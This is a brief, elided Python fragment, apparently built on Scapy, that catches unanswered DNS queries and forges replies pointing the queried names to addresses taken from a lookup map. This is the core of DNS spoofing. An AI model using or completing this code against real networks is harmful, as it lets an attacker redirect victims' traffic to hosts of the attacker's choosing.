...
def queue_callback2(packet):
    ...
    if (scapy_packet.haslayer(DNSQR) and scapy_packet[DNS].ancount == 0):
...
def modify_packet2(packet):
    ...
    new_packet = IP(dst=packet[IP].src)/UDP(dport=packet[UDP].sport, sport=53)/DNS(id=packet[DNS].id,qd=packet[DNS].qd,qr=1,ancount=1,an=DNSRR(rrname=qname, rdata=dns_map[qname]))
